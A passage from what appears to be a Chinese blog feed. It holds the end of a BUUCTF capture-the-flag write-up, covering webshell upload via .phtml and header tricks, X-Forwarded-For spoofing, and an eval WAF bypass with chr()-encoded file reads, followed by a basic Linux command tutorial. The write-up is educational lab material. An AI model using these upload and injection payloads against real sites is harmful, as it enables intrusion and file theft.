src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221522605.png" alt="image-20220322152233580"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221522389.png" alt="image-20220322152245360"></p><p>加个X-Forwarded-For</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For:127.0.0.1</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221524380.png" alt="image-20220322152429354"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221524267.png"></p><h1 id="文件头加phtml文件上传"><a href="#文件头加phtml文件上传" class="headerlink" title="文件头加phtml文件上传"></a>文件头加phtml文件上传</h1><p><a href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Upload">BUUCTF[极客大挑战 2019]Upload</a></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221532102.png" alt="image-20220322153258956"></p><p>进来是个文件上传,一般主要检查的地方主要是:后缀名 content-type 文件头的部分内容</p><p>上传一个php的文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221538930.png" alt="image-20220322153810871"></p><p>接下来尝试phtml 加上修改content-type,也可以先上传图片在改名</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221540414.png" alt="image-20220322154000345"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221540880.png" alt="image-20220322154009719"></p><p>那是不是检查了文件头呢</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221548145.png" alt="image-20220322154803072"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221548123.png" alt="image-20220322154814044"></p><p>然后呢?文件位置呢?</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://2fef9b1d-d14e-48be-b6a8-267aaf53075b.node4.buuoj.cn:81/upload/</span><br></pre></td></tr></table></figure><p>发现一个目录遍历漏洞</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221545781.png" alt="image-20220322154558713"></p><p>啊这么多</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221558902.png" alt="image-20220322155818879"></p><p>连一下试试</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221558283.png" alt="image-20220322155835246"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221558699.png" alt="image-20220322155853671"></p><h1 id="文件头加phtml文件上传-1"><a href="#文件头加phtml文件上传-1" class="headerlink" title="文件头加phtml文件上传"></a>文件头加phtml文件上传</h1><p><a href="https://buuoj.cn/challenges#[ACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B]Upload">BUUCTF[ACTF2020 新生赛]Upload</a></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221702144.png" alt="image-20220322160147880"></p><p>发现文件上传</p><p>直接传一个php文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221603552.png" alt="image-20220322160301378"></p><p>发现有前段验证,抓包改一下</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221603045.png" alt="image-20220322160347019"></p><p>上传一个phtml的文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221612128.png" alt="image-20220322161223047"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221612951.png" alt="image-20220322161233884"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221612457.png" alt="image-20220322161257396"></p><h1 id="waf参数解析漏洞"><a href="#waf参数解析漏洞" class="headerlink" title="waf参数解析漏洞"></a>waf参数解析漏洞</h1><p><a href="https://buuoj.cn/challenges#[RoarCTF%202019]Easy%20Calc">BUUCTF[RoarCTF 2019]Easy Calc</a></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221622895.png" alt="image-20220322162246858"></p><p>一个计算器,小试一下都不行,那么看源码,扫目录</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221623715.png" alt="image-20220322162338629"></p><p>搜了一下.php发现有一个calc.php访问一下得到源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;<span class="comment">#没设置num就返回源码</span></span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];<span class="comment">#黑名单空格 制表符 回车 换行 &#x27; &quot; ` [ ] $ \ ^</span></span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123;<span class="comment">#这里的/m表示匹配多行</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里需要小小了解一下php的解析规则,当php进行解析的时候,如果变量前面有空格,会去掉前面的空格再做解析</p><p>也就是说这个waf会对这个num参数进行过滤,如果有危险就直接拦截,但是呢如果我们在num前加一个 空格那么num就会变成 num 也就是空格+num 那么waf就找不到num这个变量,进而无法去过滤.而php在解析参数之前会去掉前面的空格,那么php照样会正确解析.</p><p>scandir()</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这个命令会列出参数目录中的文件和目录</span><br></pre></td></tr></table></figure><p>这里就需要使用scandir(‘&#x2F;‘)来列出文件,但是&#x2F;被过滤了,那么可以使用chr(47)代替这里的47就是&#x2F;</p><p>在使用var_dump()输出数组的所有信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/calc.php?%20num=1;var_dump(scandir(chr(47)))</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221644889.png" alt="image-20220322164444852"></p><p>接着就是使用file_get_contents()函数读取文件了,与上面相似也是使用chr(构造)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/calc.php?%20num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221651362.png" alt="image-20220322165131331"></p><p>php的字符串解析特性</p><p>php将查询字符串(在url或正文中)转换为内部$_GET或$_POST.例如:?foo&#x3D;bar变成Array([foo]&#x3D;&gt;”bar”).值得注意的是,查询字符串在解析的过程中会将某个字符删除或用下滑线进行替代.</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/? news[id%00=42</span><br></pre></td></tr></table></figure><p>会变成Array([news_id&#x3D;&gt;42]).如果一个IDS&#x2F;IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截,那么我们就可以用以下语句绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/news.php? news[id%00=42&quot;+AND+1=00_</span><br></pre></td></tr></table></figure><p>上述php语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中</p><p>HP需要将所有参数转换为有效的变量名,因此在解析查询字符串时,他会做两件事</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">删除空白符</span><br><span class="line">将某些字符转换为下划线(包括空格)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> BUUCTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux学习(一)</title>
      <link href="/Linux/Linux/Linux-linux%E6%93%8D%E4%BD%9C%E5%AD%A6%E4%B9%A0(%E4%B8%80)/"/>
      <url>/Linux/Linux/Linux-linux%E6%93%8D%E4%BD%9C%E5%AD%A6%E4%B9%A0(%E4%B8%80)/</url>
      
        <content type="html"><![CDATA[<h1 id="linux操作学习-一"><a href="#linux操作学习-一" class="headerlink" title="linux操作学习(一)"></a>linux操作学习(一)</h1><h2 id="常用linux命令"><a href="#常用linux命令" class="headerlink" title="常用linux命令"></a>常用linux命令</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">man man 查看man的帮助信息</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203190950684.png" alt="image-20220319095025568"></p><p>man命令中常用按键以及作用</p><table><thead><tr><th align="left">按键</th><th>作用</th></tr></thead><tbody><tr><td align="left">空格键</td><td>向下翻一页</td></tr><tr><td align="left">PaGe down</td><td>向下翻一页</td></tr><tr><td align="left">PaGe up</td><td>向上翻一页</td></tr><tr><td align="left">home</td><td>直接前往首页</td></tr><tr><td align="left">end</td><td>直接前往尾页</td></tr><tr><td align="left">&#x2F;</td><td>从上至下搜索某个关键词，如“&#x2F;linux”</td></tr><tr><td align="left">?</td><td>从下至上搜索某个关键词，如“?linux”</td></tr><tr><td align="left">n</td><td>定位到下一个搜索到的关键词</td></tr><tr><td align="left">N</td><td>定位到上一个搜索到的关键词</td></tr><tr><td align="left">q</td><td>退出帮助文档</td></tr></tbody></table><p> man命令中帮助信息的结构以及意义</p><table><thead><tr><th>结构名称</th><th>代表意义</th></tr></thead><tbody><tr><td>NAME</td><td>命令的名称</td></tr><tr><td>SYNOPSIS</td><td>参数的大致使用方法</td></tr><tr><td>DESCRIPTION</td><td>介绍说明</td></tr><tr><td>EXAMPLES</td><td>演示（附带简单说明）</td></tr><tr><td>OVERVIEW</td><td>概述</td></tr><tr><td>DEFAULTS</td><td>默认的功能</td></tr><tr><td>OPTIONS</td><td>具体的可用选项（带介绍）</td></tr><tr><td>ENVIRONMENT</td><td>环境变量</td></tr><tr><td>FILES</td><td>用到的文件</td></tr><tr><td>SEE ALSO</td><td>相关的资料</td></tr><tr><td>HISTORY</td><td>维护历史与联系方式</td></tr></tbody></table><p><strong>Tab键</strong></p><p>它能够实现对命令、参数或文件的内容补全</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">re&lt;Tab键&gt;&lt;Tab键&gt;</span><br><span class="line">read                readlink            realpath </span><br></pre></td></tr></table></figure><p><strong>ctrl+c</strong></p><p>当同时按下键盘上的Ctrl和字母c的时候，意味着终止当前进程的运行。假如执行了一个错误命令，或者是执行某个命令后迟迟无法结束，这时就可以冷静地按下Ctrl+c组合键，命令行终端的控制权会立刻回到我们手中。</p><p><strong>Ctrl+d</strong></p><p>当同时按下键盘上的Ctrl和字母d的时候，表示键盘输入结束。</p><p><strong>Ctrl+l</strong></p><p>当同时按下键盘上的Ctrl和字母l的时候，会清空当前终端中已有的内容（相当于清屏操作）</p><h3 id="常用系统工作命令"><a href="#常用系统工作命令" class="headerlink" title="常用系统工作命令"></a>常用系统工作命令</h3><h4 id="echo命令"><a href="#echo命令" class="headerlink" title="echo命令"></a>echo命令</h4><p>echo命令用于在终端设备上输出字符串或变量提取后的值,语法格式为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo [字符串] [$变量]</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191005710.png" alt="image-20220319100544685"></p><h4 id="date命令"><a href="#date命令" class="headerlink" title="date命令"></a>date命令</h4><p>date命令用于显示或设置系统的时间和日期,语法格式为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">date [+指定的格式]</span><br></pre></td></tr></table></figure><p> date命令中的参数及其作用</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>%S</td><td>秒（00～59）</td></tr><tr><td>%M</td><td>分钟（00～59）</td></tr><tr><td>%H</td><td>小时（00～23）</td></tr><tr><td>%I</td><td>小时（00～12）</td></tr><tr><td>%m</td><td>月份（1~12）</td></tr><tr><td>%p</td><td>显示出AM或PM</td></tr><tr><td>%a</td><td>缩写的工作日名称（例如：Sun）</td></tr><tr><td>%A</td><td>完整的工作日名称（例如：Sunday）</td></tr><tr><td>%b</td><td>缩写的月份名称（例如：Jan）</td></tr><tr><td>%B</td><td>完整的月份名称（例如：January）</td></tr><tr><td>%q</td><td>季度（1~4）</td></tr><tr><td>%y</td><td>简写年份（例如：20）</td></tr><tr><td>%Y</td><td>完整年份（例如：2020）</td></tr><tr><td>%d</td><td>本月中的第几天</td></tr><tr><td>%j</td><td>今年中的第几天</td></tr><tr><td>%n</td><td>换行符（相当于按下回车键）</td></tr><tr><td>%t</td><td>跳格（相当于按下Tab键）</td></tr></tbody></table><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191008337.png" alt="image-20220319100831310"></p><p>将系统时间设置为2022年3月19日10点09分的date命令如下</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191010002.png" alt="image-20220319101018971"></p><p>date命令中的参数%j可用来查看今天是当年中的第几天。这个参数能够很好地区分备份时间的早晚，即数字越大，越靠近当前时间。该参数的使用方式以及显示结果如下所示</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191011172.png" alt="image-20220319101116145"></p><h4 id="timedatectl命令"><a href="#timedatectl命令" class="headerlink" title="timedatectl命令"></a>timedatectl命令</h4><p>timedatectl命令用于设置系统的时间,英文全称为”time date control”,语法格式 </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">timedatectl [参数]</span><br></pre></td></tr></table></figure><p>timedatectl命令中的参数以及作用</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>status</td><td>显示状态信息</td></tr><tr><td>list-timezones</td><td>列出已知时区</td></tr><tr><td>set-time</td><td>设置系统时间</td></tr><tr><td>set-timezone</td><td>设置生效时区</td></tr></tbody></table><p>查看系统时间与时区的方法如下</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191013398.png" alt="image-20220319101351367"></p><p>手动设置为上海时区</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191015650.png" alt="image-20220319101553616"></p><h4 id="reboot命令"><a href="#reboot命令" class="headerlink" title="reboot命令"></a>reboot命令</h4><p>reboot命令用于重启系统,输入改命令回车之后就可执行,需要使用root身份来操作</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191017545.png" alt="image-20220319101717518"></p><h4 id="poweroff命令"><a href="#poweroff命令" class="headerlink" title="poweroff命令"></a>poweroff命令</h4><p>poweroff命令用于关闭系统,输入该命令之后按回车即可执行</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191018648.png" alt="image-20220319101822622"></p><h4 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h4><p>wget命令用于在终端命令行中下载网络文件，英文全称为“web get”，语法格式为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget [参数] 网址</span><br></pre></td></tr></table></figure><p>借助于wget命令，可以无须打开浏览器，直接在命令行界面中就能下载文件</p><p>wget命令中的参数以及作用</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-b</td><td>后台下载模式</td></tr><tr><td>-P</td><td>下载到指定目录</td></tr><tr><td>-t</td><td>最大尝试次数</td></tr><tr><td>-c</td><td>断点续传</td></tr><tr><td>-p</td><td>下载页面内所有资源，包括图片、视频等</td></tr><tr><td>-r</td><td>递归下载</td></tr></tbody></table><h4 id="ps命令"><a href="#ps命令" class="headerlink" title="ps命令"></a>ps命令</h4><p>ps命令用于查看系统中的进程状态,英文全称为processes,语法 </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps [参数]</span><br></pre></td></tr></table></figure><p> ps命令中的参数以及作用</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-a</td><td>显示所有进程（包括其他用户的进程）</td></tr><tr><td>-u</td><td>用户以及其他详细信息</td></tr><tr><td>-x</td><td>显示没有控制终端的进程</td></tr></tbody></table><p>Linux系统中时刻运行着许多进程，如果能够合理地管理它们，则可以优化系统的性能。在Linux系统中有5种常见的进程状态，分别为运行、中断、不可中断、僵死与停止，其各自含义如下所示</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">R（运行）：进程正在运行或在运行队列中等待。</span><br><span class="line">S（中断）：进程处于休眠中，当某个条件形成后或者接收到信号时，则脱离该   状态。</span><br><span class="line">D（不可中断）：进程不响应系统异步信号，即便用kill命令也不能将其中断。</span><br><span class="line">Z（僵死）：进程已经终止，但进程描述符依然存在, 直到父进程调用wait4()系统函数后将进程释放。</span><br><span class="line">T（停止）：进程收到停止信号后停止运行。</span><br></pre></td></tr></table></figure><p> 进程状态</p><table><thead><tr><th>USER</th><th>PID</th><th>%CPU</th><th>%MEM</th><th>VSZ</th><th>RSS</th><th>TTY</th><th>STAT</th><th>START</th><th>TIME</th><th>COMMAND</th></tr></thead><tbody><tr><td>进程的所有者</td><td>进程ID号</td><td>运算器占用率</td><td>内存占用率</td><td>虚拟内存使用量(单位是KB)</td><td>占用的固定内存量(单位是KB)</td><td>所在终端</td><td>进程状态</td><td>被启动的时间</td><td>实际使用CPU的时间</td><td>命令名称与参数</td></tr><tr><td>root</td><td>1</td><td>0.0</td><td>0.5</td><td>244740</td><td>10636</td><td>?</td><td>Ss</td><td>07:54</td><td>0:02</td><td>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;  systemd –switched-root –system –deserialize 18</td></tr><tr><td>root</td><td>2</td><td>0.0</td><td>0.0</td><td>0</td><td>0</td><td>?</td><td>S</td><td>07:54</td><td>0:00</td><td>[kthreadd]</td></tr><tr><td>root</td><td>3</td><td>0.0</td><td>0.0</td><td>0</td><td>0</td><td>?</td><td>I&lt;</td><td>07:54</td><td>0:00</td><td>[rcu_gp]</td></tr><tr><td>root</td><td>4</td><td>0.0</td><td>0.0</td><td>0</td><td>0</td><td>?</td><td>I&lt;</td><td>07:54</td><td>0:00</td><td>[rcu_par_gp]</td></tr><tr><td>root</td><td>5</td><td>0.0</td><td>0.0</td><td>0</td><td>0</td><td>?</td><td>I&lt;</td><td>07:54</td><td>0:00</td><td>[kworker&#x2F;0:0H-kbl</td></tr><tr><td>root</td><td>6</td><td>0.0</td><td>0.0</td><td>0</td><td>0</td><td>?</td><td>I&lt;</td><td>07:54</td><td>0:00</td><td>[mm_percpu_wq]</td></tr><tr><td>root</td><td>7</td><td>0.0</td><td>0.0</td><td>0</td><td>0</td><td>?</td><td>S</td><td>07:54</td><td>0:00</td><td>[ksoftirqd&#x2F;0]</td></tr><tr><td>root</td><td>8</td><td>0.0</td><td>0.0</td><td>0</td><td>0</td><td>?</td><td>I</td><td>07:54</td><td>0:00</td><td>[rcu_sched]</td></tr><tr><td>root</td><td>9</td><td>0.0</td><td>0.0</td><td>0</td><td>0</td><td>?</td><td>S</td><td>07:54</td><td>0:00</td><td>[migration&#x2F;0]</td></tr></tbody></table><h4 id="pstree命令"><a href="#pstree命令" class="headerlink" title="pstree命令"></a>pstree命令</h4><p>pstree命令用于以树状图的形式展示进程之间的关系,英文全称为process tree 输入改命令之后按回车执行即可</p><h4 id="top命令"><a href="#top命令" class="headerlink" title="top命令"></a>top命令</h4><p>top命令用于动态监控进程活动以及系统负载等信息</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191027751.png" alt="image-20220319102745696"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第1行：系统时间、运行时间、登录终端数、系统负载（3个数值分别为1分钟、5分钟、15分钟内的平均值，数值越小意味着负载越低）。</span><br><span class="line">第2行：进程总数、运行中的进程数、睡眠中的进程数、停止的进程数、僵死的进程数。</span><br><span class="line">第3行：用户占用资源百分比、系统内核占用资源百分比、改变过优先级的进程资源百分比、空闲的资源百分比等。其中数据均为CPU数据并以百分比格式显示，例如“99.9 id”意味着有99.9%的CPU处理器资源处于空闲。</span><br><span class="line">第4行：物理内存总量、内存空闲量、内存使用量、作为内核缓存的内存量。</span><br><span class="line">第5行：虚拟内存总量、虚拟内存空闲量、虚拟内存使用量、已被提前加载的内存量。</span><br></pre></td></tr></table></figure><h4 id="nice命令"><a href="#nice命令" class="headerlink" title="nice命令"></a>nice命令</h4><p>nice命令用于调整进程的优先级,语法格式</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nice 优先级数字 服务名称</span><br></pre></td></tr></table></figure><p>在top命令输出的结果中，PR和NI值代表的是进程的优先级，数字越低（取值范围是-20～19），优先级越高。在日常的生产工作中，可以将一些不重要进程的优先级调低，让紧迫的服务更多地利用CPU和内存资源，以达到合理分配系统资源的目的。例如将bash服务的优先级调整到最高</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191030964.png" alt="image-20220319103034935"></p><h4 id="pidof命令"><a href="#pidof命令" class="headerlink" title="pidof命令"></a>pidof命令</h4><p>pidof命令用于查询某个指定服务进程的pid号码值,语法格式为 </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pidof [参数] 服务名称</span><br></pre></td></tr></table></figure><p>每个进程的进程号码值（PID）是唯一的，可以用于区分不同的进程。例如，执行如下命令来查询本机上sshd服务程序的PID：</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191032996.png" alt="image-20220319103204966"></p><h4 id="killall命令"><a href="#killall命令" class="headerlink" title="killall命令"></a>killall命令</h4><p>killall命令用于终止某个指定名称的服务所对应的全部进程,语法格式为 </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">killall [参数] 服务名称</span><br></pre></td></tr></table></figure><p>通常来讲，复杂软件的服务程序会有多个进程协同为用户提供服务，如果用kill命令逐个去结束这些进程会比较麻烦，此时可以使用killall命令来批量结束某个服务程序带有的全部进程。下面以httpd服务程序为例，来结束其全部进程</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191036161.png" alt="image-20220319103653129"></p><p>如果在系统终端中执行一个命令后想立即停止它，可以同时按下Ctrl +  C组合键（生产环境中比较常用的一个组合键），这样将立即终止该命令的进程。或者，如果有些命令在执行时不断地在屏幕上输出信息，影响到后续命令的输入，则可以在执行命令时在末尾添加一个&amp;符号，这样命令将进入系统后台来执行</p><h3 id="系统状态检测命令"><a href="#系统状态检测命令" class="headerlink" title="系统状态检测命令"></a>系统状态检测命令</h3><h4 id="ifconfig命令"><a href="#ifconfig命令" class="headerlink" title="ifconfig命令"></a>ifconfig命令</h4><p>ifconfig命令用于获取网卡配置与网络等信息,英文全称为 interface config,语法格式</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ifconfig [参数][网络设备]</span><br></pre></td></tr></table></figure><p>ifconfig命令来查看本机当前的网卡配置与网络状态等信息时，其实主要查看的就是网卡名称、inet参数后面的IP地址、ether参数后面的网卡物理地址（又称为MAC地址），以及RX、TX的接收数据包与发送数据包的个数及累计流量</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191041774.png" alt="image-20220319104134733"></p><h4 id="uname命令"><a href="#uname命令" class="headerlink" title="uname命令"></a>uname命令</h4><p>uname命令用于查看西永内核版本与系统架构等信息,英文全称为 Unix name 语法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname [-a]</span><br></pre></td></tr></table></figure><p>在使用uname命令时，一般要固定搭配上-a参数来完整地查看当前系统的内核名称、主机名、内核发行版本、节点名、压制时间、硬件名称、硬件平台、处理器类型以及操作系统名称等信息</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191043609.png" alt="image-20220319104339578"></p><h4 id="uptime命令"><a href="#uptime命令" class="headerlink" title="uptime命令"></a>uptime命令</h4><p>uptime命令用于查看系统的负载信息</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191045462.png" alt="image-20220319104551428"></p><h4 id="free命令"><a href="#free命令" class="headerlink" title="free命令"></a>free命令</h4><p>free命令用于显示当前系统中内存的使用量信息,语法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">free [-h]</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191048929.png" alt="image-20220319104854896"></p><h4 id="who命令"><a href="#who命令" class="headerlink" title="who命令"></a>who命令</h4><p>who命令用于查看当前登入主机的用户终端信息</p><p>这3个简单的字母可以快速显示出所有正在登录本机的用户名称以及他们正在开启的终端信息；如果有远程用户，还会显示出来访者的IP地址</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191050327.png" alt="image-20220319105010293"></p><h4 id="last命令"><a href="#last命令" class="headerlink" title="last命令"></a>last命令</h4><p>last命令用于调取主机的被访记录</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191051344.png" alt="image-20220319105112298"></p><h4 id="ping命令"><a href="#ping命令" class="headerlink" title="ping命令"></a>ping命令</h4><p>ping命令用于测试主机之间的网络连通性</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping [参数] 主机地址</span><br></pre></td></tr></table></figure><p>ping命令中的参数以及作用</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-c</td><td>总共发送次数</td></tr><tr><td>-l</td><td>指定网卡名称</td></tr><tr><td>-i</td><td>每次间隔时间（秒）</td></tr><tr><td>-W</td><td>最长等待时间（秒）</td></tr></tbody></table><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191053287.png" alt="image-20220319105305254"></p><h4 id="tracepath命令"><a href="#tracepath命令" class="headerlink" title="tracepath命令"></a>tracepath命令</h4><p>tracepath命令用于显示数据包到达目的主机途中经过的所有路由信息,语法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tracepath [参数] 域名</span><br></pre></td></tr></table></figure><h4 id="netstat命令"><a href="#netstat命令" class="headerlink" title="netstat命令"></a>netstat命令</h4><p>netstat命令用于显示如网络连接 路由表 接口状态等的网络相关信息,英文全称为 netword status 语法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat [参数]</span><br></pre></td></tr></table></figure><p>  netstat命令中的参数以及作用</p><table><thead><tr><th>-a</th><th>显示所有连接中的Socket</th></tr></thead><tbody><tr><td>-p</td><td>显示正在使用的Socket信息</td></tr><tr><td>-t</td><td>显示TCP协议的连接状态</td></tr><tr><td>-u</td><td>显示UDP协议的连接状态</td></tr><tr><td>-n</td><td>使用IP地址，不使用域名</td></tr><tr><td>-l</td><td>仅列出正在监听的服务状态</td></tr><tr><td>-i</td><td>显示网卡列表信息</td></tr><tr><td>-r</td><td>显示路由表信息</td></tr></tbody></table><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191144807.png" alt="image-20220319114434756"></p><p>显示网卡列表</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191145017.png" alt="image-20220319114526984"></p><h4 id="history命令"><a href="#history命令" class="headerlink" title="history命令"></a>history命令</h4><p>history命令用于显示执行过的命令的历史</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">history [-c]</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191146741.png" alt="image-20220319114648703"></p><p>历史命令会被保存到用户家目录中的.bash_history文件中。Linux系统中以点（.）开头的文件均代表隐藏文件，这些文件大多数为系统服务文件，可以用cat命令查看其文件内容：</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191147441.png" alt="image-20220319114733402"></p><p>要清空当前在主机上执行的linux命令的历史记录</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191148071.png" alt="image-20220319114846042"></p><h4 id="sosreport命令"><a href="#sosreport命令" class="headerlink" title="sosreport命令"></a>sosreport命令</h4><p>sosreport命令用于收集系统配置及架构信息并输出诊断文档</p><p>当Linux系统出现故障需要联系技术支持人员时，大多数时候都要先使用这个命令来简单收集系统的运行状态和服务配置信息，以便让技术支持人员能够远程解决一些小问题，抑或让他们能提前了解某些复杂问题。在下面的输出信息中，加粗的部分是收集好的资料压缩文件以及校验码</p><h3 id="查找定位文件的命令"><a href="#查找定位文件的命令" class="headerlink" title="查找定位文件的命令"></a>查找定位文件的命令</h3><h4 id="pwd命令"><a href="#pwd命令" class="headerlink" title="pwd命令"></a>pwd命令</h4><p>pwd命令用于显示用户当前所处的工作目录,英文全称为 